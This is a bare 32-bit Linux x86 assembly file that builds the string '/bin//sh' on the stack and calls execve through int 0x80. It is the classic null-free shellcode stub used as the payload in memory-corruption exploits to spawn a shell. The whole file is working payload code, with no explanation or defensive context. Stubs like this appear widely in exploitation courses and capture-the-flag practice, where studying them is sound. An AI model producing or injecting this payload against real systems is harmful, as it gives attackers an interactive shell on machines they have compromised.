section .text

global _start

_start:

xor eax, eax
sub esp, 4
mov [esp], eax
push   0x68732f2f
push   0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, 11
int 0x80
